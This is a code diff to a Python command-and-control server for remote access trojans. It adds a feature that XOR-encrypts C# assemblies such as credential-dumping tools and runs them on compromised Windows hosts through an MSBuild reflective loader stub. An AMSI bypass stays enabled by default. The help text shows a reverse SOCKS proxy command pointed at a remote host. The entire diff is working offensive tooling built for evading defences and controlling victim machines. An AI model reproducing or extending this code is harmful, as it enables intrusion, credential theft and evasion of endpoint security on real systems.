@@ -1,6 +1,7 @@
 #!/usr/bin/env python3
 from flask import Flask, request
 from datetime import datetime
+from itertools import cycle
 from pathlib import Path
 import threading
 import argparse
@@ -26,7 +27,7 @@ port = args.port
 ssl = args.ssl
 
 supported_types = ["c", "py", "js", "ps1", "hta"]
-msbuild_path = "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe"
+msbuild_path = "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild"
 
 # Only applies to hta and js rats
 prepend_amsi_bypass_to_psh = True
@@ -134,7 +135,7 @@ def create_psscript(filepath, extra_cmds=""):
         b64data = base64.b64encode(data.encode('utf-8')).decode('utf-8')
         return(b64data)
 
-def send_msbuild_xml(script):
+def send_nps_msbuild_xml(script):
     with open(os.getcwd() + "/resources/nps_modified.xml" , "r") as fd:
         msbuild_data = fd.read().replace("~~SCRIPT~~" , script)
 
@@ -144,6 +145,58 @@ def send_msbuild_xml(script):
 
     msbuild_data = msbuild_data.replace("~~AMSI~~" , amsi)
     return base64.b64encode(msbuild_data.encode('utf-8')).decode('utf-8')
+
+def send_csharper_msbuild_xml(input_data, ratID):
+    assembly_path = input_data.split(" ")[1]
+
+    with open(os.getcwd() + "/resources/csharper_modified.xml" , "r") as fd:
+        csharper_data = fd.read()
+
+    with open(Path(assembly_path).resolve() , "rb") as fd:
+        assembly_data = fd.read()
+
+    csharper_data = csharper_data.replace("~~KEY~~", ratID)
+    csharper_data = csharper_data.replace("~~ARGS~~", parse_c_sharp_args(input_data))
+    csharper_data = csharper_data.replace("~~ASSEMBLY~~", xor_crypt_and_encode(assembly_data, ratID))
+    b64data = base64.b64encode(csharper_data.encode('utf-8')).decode('utf-8')
+    return(b64data)
+
+# Parses an operator's "cs" line to the correct format needed in msbuild xml file
+# Example: cs SharpDump.exe arg1 arg2 "third arg" ->  "arg1", "arg2", "third arg" 
+def parse_c_sharp_args(argument_string):
+	stringlist = []
+	stringbuilder = ""
+	inside_quotes = False
+
+	args = argument_string.split(" ")[2:]
+	args = " ".join(args)
+
+	if(not args):
+		return("  ")
+	for ch in args:
+		if(ch == " " and not inside_quotes):
+			stringlist.append(stringbuilder) # Add finished string to the list
+			stringbuilder = "" # Reset the string
+		elif(ch == '"'):
+			inside_quotes = not inside_quotes
+		else: # Ch is a normal character
+			stringbuilder += ch # Add next ch to string
+
+	# Finally...
+	stringlist.append(stringbuilder)
+	for arg in stringlist:
+		if(arg == ""):
+			stringlist.remove(arg)
+
+	argument_string = '", "'.join(stringlist)
+	return(' "' + argument_string + '" ')
+
+# Simple xor cipher to encrypt C# binaries and encode them into a base64 string
+def xor_crypt_and_encode(data, key):
+     xored = []
+     for (x,y) in zip(data, cycle(key)):
+         xored.append(x ^ ord(y))
+     return(base64.b64encode(bytes(xored)).decode('utf-8'))
 
 def serve_server(port=8080):
     app = Flask(__name__)
@@ -252,6 +305,7 @@ def get_help():
     print("spawn -- used to spawn a new rat in a new process.")
     print("psh <local_powershell_script_path> <extra powershell commands> -- Runs the powershell script on the rat. Uses MSBuild.exe or powershell.exe depending on the agent type")
     print("example: psh script/Invoke-SocksProxy.ps1 Invoke-ReverseSocksProxy -remotePort 4444 -remoteHost 12.23.34.45")
+    print("cs <local_c_sharp_exe_path> <command_arguments> -- Runs the assembly on the remote host using MSBuild.exe and a C Sharp reflective loader stub")
     print("-------------------------------------------------------------------------")
     print("")
     print("Extra things to know:")
@@ -261,7 +315,9 @@ def get_help():
     print("Some rats need to write to disk for execution or cmd output. Every rat that must write to disk cleans up files created.")
     print("By default, rat communications are NOT SECURE. Do not send sensitive info through the C2 channel unless using SSL")
     print("Rats are designed to use methods native to their type as much as possible. E.g.: HTA rat will never use Powershell.exe, and the Powershell rat will never use cmd.exe")
-    print("Tal Liberman's AMSI Bypass is included by default for msbuild psh execution (js and hta ONLY). This may not be desireable and can be turned off by changing the variable at the beginning of this script\n")
+    print("Tal Liberman's AMSI Bypass is included by default for msbuild psh execution (js and hta ONLY). This may not be desireable and can be turned off by changing the variable at the beginning of this script")
+    print("All assemblies run with \"cs\" must be compiled with a public Main method and a public class that contains Main\n")
+
 
 if __name__ == "__main__":
     # Start the Flask server
@@ -341,11 +397,21 @@ if __name__ == "__main__":
                             if(types[ratID] == "ps1"):
                                 inp = "psh " + create_psscript(filepath, extra_cmds)
                             else:
-                                inp = "psh " + msbuild_path + " " + send_msbuild_xml(create_psscript(filepath, extra_cmds))
+                                inp = "psh " + msbuild_path + " " + send_nps_msbuild_xml(create_psscript(filepath, extra_cmds))
                         except:
                             print("[!] Could not open file " + filepath + " for reading")
                             continue
 
+                    elif(str.startswith(inp, "cs ")):
+                        try:
+                            filepath = inp.split(" ")[1]
+                            if(types[ratID] == "ps1"):
+                                print("[!] Powershell rats do not support \"cs\"!")
+                            else:
+                                inp = "cs " + msbuild_path + " " + send_csharper_msbuild_xml(inp, ratID)
+                        except:
+                            print("[!] Could not open file " + filepath + " for reading")
+                            continue
 
                     print("[*] Queued command " + colors(inp) + " for " + colors(ratID))
                     if(ratID == "all"):
